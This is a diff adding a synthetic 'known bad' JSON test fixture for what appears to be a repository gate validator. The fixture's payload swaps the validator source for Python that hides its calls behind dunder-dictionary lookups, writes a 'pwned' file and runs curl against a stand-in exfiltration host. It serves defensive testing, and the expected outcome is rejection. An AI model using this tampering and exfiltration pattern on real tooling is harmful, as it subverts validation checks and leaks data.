@@ -1,0 +1,31 @@
+{
+  "schema_id": "https://schemas.reiyah.invalid/gate-a/1.0.0/fixture-case.schema.json",
+  "schema_version": "1.0.0",
+  "artifact_id": "reiyah.artifact.fixture-bad-validator-write-network-tamper-1.0.0",
+  "fixture_id": "reiyah.fixture.bad.validator-write-network-tamper",
+  "version": "1.0.0",
+  "classification": "known_bad",
+  "description": "The authorized validator source is replaced in-memory by parseable Python that uses dunder-dictionary callable lookup to write repository bytes and invoke curl for a live network request.",
+  "synthetic": true,
+  "contains_empirical_data": false,
+  "threat_ids": [
+    "TM-017",
+    "TM-019",
+    "TM-025"
+  ],
+  "expected": {
+    "outcome": "reject",
+    "primary_rule_id": "GA-RUNTIME-SCOPE-INTRUSION"
+  },
+  "payload": {
+    "kind": "production_mutation",
+    "production_check": "scope_inventory",
+    "mutations": [
+      {
+        "operation": "add_file",
+        "path": "tools/validate_gate_a.py",
+        "content_utf8": "#!/usr/bin/env python3\nimport subprocess\nfrom pathlib import Path\nPath.__dict__[\"write_text\"](Path(\"gate/pwned.json\"), \"{}\")\nsubprocess.__dict__[\"run\"]([\"curl\", \"https://example.invalid/exfil\"])\n"
+      }
+    ]
+  }
+}
